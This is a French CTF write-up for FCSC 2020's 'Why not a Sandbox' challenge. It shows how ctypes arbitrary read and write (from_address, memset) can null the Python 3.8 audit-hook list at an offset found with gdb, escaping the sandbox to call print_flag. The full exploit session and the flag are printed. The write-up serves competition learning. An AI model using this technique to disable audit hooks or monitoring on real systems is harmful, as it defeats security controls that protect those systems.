---
title: "[FR] Write-up FCSC 2020 : Why not a Sandbox"
date: 2020-05-04T18:00:00+02:00
draft: false
tags:
- CTF
- FCSC
- FCSC 2020
---

# I - Intro
Le challenge se compose d'un interpréteur Python 3.8.2 avec lequel nous pouvons interagir via une simple connexion TCP obtenable avec `netcat`. Cet interpréteur modifié va lever une exception lorsque certaine actions sont effectuées. Il est donc impossible d'appeler `os.system` pour obtenir un shell ou d'ouvrir un fichier avec `open()`. Le but est donc d'appeler la fonction `print_flag()` qui a été ajoutée à la librairie principale de Python, qui peut être accédée via le module `ctypes`. Cependant celle-ci va aussi lever une exception.
```
$ nc challenges1.france-cybersecurity-challenge.fr 4005
Arriverez-vous à appeler la fonction print_flag ?
Python 3.8.2 (default, Apr  1 2020, 15:52:55)
[GCC 9.3.0] on linux
>>> import os
Exception ignored in audit hook:
Exception: Action interdite
Exception: Module non autorisé
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
Exception: Action interdite
>>> open("/etc/passwd", "r")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
Exception: Action interdite
>>> import ctypes
>>> ctypes.pythonapi.print_flag()
Exception: Nom de fichier interdit
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.8/ctypes/__init__.py", line 386, in __getattr__
    func = self.__getitem__(name)
  File "/usr/lib/python3.8/ctypes/__init__.py", line 391, in __getitem__
    func = self._FuncPtr((name_or_ordinal, self))
Exception: Action interdite
```

# II - Les audit hooks
Les exceptions n'apparaissent pas toutes de la même manière mais celle de `import os` indique `Exception ignored in audit hook`. L'exception est donc générée dans un audit hook. Les audit hooks sont une nouvelle fonctionnalité de Python 3.8 permettant d'exécuter une certaine fonction avant que certains évènements se produisent (Par exemple : import d'un module, appel d'une fonction, etc.). Ceux-ci sont définis dans le standard [PEP 578](https://www.python.org/dev/peps/pep-0578/).

Pour créer un audit hook, la fonction `PySys_AddAuditHook()` doit être appelée, celle-ci va ajouter le pointeur de fonction passé en paramètre dans une liste chaînée commençant par le [membre `audit_hook_head` de la structure `_PyRuntimeState`](https://github.com/python/cpython/blob/62f75fe3dd138f72303814d27183aa469eefcca6/Include/internal/pycore_runtime.h#L105). Cette structure est utilisée par l'objet global principal de l'interpréteur Python : [`_PyRuntime`](https://github.com/python/cpython/blob/252346acd937ddba4845331994b8ff4f90349625/Python/pylifecycle.c#L66).

Le but serait donc de mettre le pointeur `_PyRuntime.audit_hook_head` à `NULL` de manière à *"détruire"* la liste chaînée et rendre inefficace tous les audit hooks. Pour cela il faut connaître l'offset du membre `audit_hook_head` par rapport à `_PyRuntime`. La manière la plus simple pour le retrouver est de compiler exactement la même version de Python que celle du serveur avec le `CFLAGS` `-g` de manière à produire un binaire contenant les informations `DWARF`. Nous pouvons ensuite ouvrir cet interpréteur et y attacher un débugueur pour connaître l'offset voulu.

```
(gdb) print &(_PyRuntime.audit_hook_head)
$1 = (_Py_AuditHookEntry **) 0x788e70 <_PyRuntime+1456>
```

Donc `&_PyRuntime + 1456 == &(_PyRuntime.audit_hook_head)`.

# III - `ctypes`

`ctypes` est le module Python permettant d'utiliser des bibliothèques natives, celui-ci n'a pas été entièrement blacklisté par l'audit hook, nous pouvons donc nous servir de certaines de ses fonctions permettant des actions plutôt utiles.

`ctypes._CData.from_address()` : `ctypes` possède des classes, toutes héritantes de `_CData`, représentant différents types de données en C. On peut donc utiliser `ctypes.c_uint64.from_address(0x12345678)` pour lire un entier non signé de 64 bits à l'adresse `0x12345678`. Cette fonction permet donc d'effectuer des *arbitrary reads* dans l'espace d'adresse de python.

`ctypes.memset()` : celle-ci est plutôt claire, il s'agit de la fonction analogue à `memset(3)` en C, on peut donc s'en servir pour effectuer des *arbitrary writes* dans l'espace d'adresse de python.

`ctypes.addressof()` : Cette fonction retourne l'adresse d'un objet python, on peut donc s'en servir pour obtenir l'adresse de `_PyRuntime`. Il faut bien noter que celle-ci revoit l'adresse de l'objet Python, or `ctypes.pythonapi._PyRuntime` retournera un `_FuncPtr` permettant d'encapsuler la fonction C (bon ici ce n'est pas une fonction mais le principe reste le même), il faudra donc utiliser `ctypes.c_uint64.from_address(ctypes.addressof(ctypes.pythonapi._PyRuntime))` pour lire le premier membre du `_FuncPtr` qui correspond à la vraie adresse de `_PyRuntime`.

# IV - Exploitation finale

À l'aide des informations des paragraphes II et III, nous pouvons facilement désactiver les audit hooks et donc permettre l'appel de `print_flag()` :
```
Arriverez-vous à appeler la fonction print_flag ?
Python 3.8.2 (default, Apr  1 2020, 15:52:55) 
[GCC 9.3.0] on linux
>>> import ctypes
>>> addr_obj_run = ctypes.addressof(ctypes.pythonapi._PyRuntime)
>>> ctypes.c_uint64.from_address(addr_obj_run)
c_ulong(140211617380992)
>>> addr_run = 140211617380992
>>> ctypes.c_uint64.from_address(addr_run + 1456)
c_ulong(94195313321648)
>>> hex(94195313321648)
'0x55ab8e30a6b0'
>>> ctypes.memset(addr_run + 1456, 0, 8)
140211617382448
>>> ctypes.c_uint64.from_address(addr_run + 1456)
c_ulong(0)
>>> open("")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
FileNotFoundError: [Errno 2] No such file or directory: ''
>>> ctypes.pythonapi.print_flag
<_FuncPtr object at 0x7f858eeeadc0>
>>> ctypes.pythonapi.print_flag()
super flag: FCSC{55660e5c9e048d988917e2922eb1130063ebc1030db025a81fd04bda75bab1c3}
83
```
